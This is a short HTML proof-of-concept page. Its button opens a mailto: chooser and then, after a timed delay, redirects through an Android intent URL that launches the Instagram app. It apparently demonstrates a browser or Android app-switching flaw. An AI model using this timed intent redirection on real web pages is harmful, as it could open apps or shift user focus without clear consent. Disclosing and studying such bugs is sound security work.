<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PoC</title>
</head>
<body>

<button onclick="start()">Open</button>

<script>
function start() {
  // 1. Trigger Gmail chooser
  location.href = "mailto:test@gmail.com";

  // 2. After chooser shows, redirect to Instagram
  setTimeout(() => {
    location.href =
      "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end";
  }, 800);
}
</script>

</body>
</html>
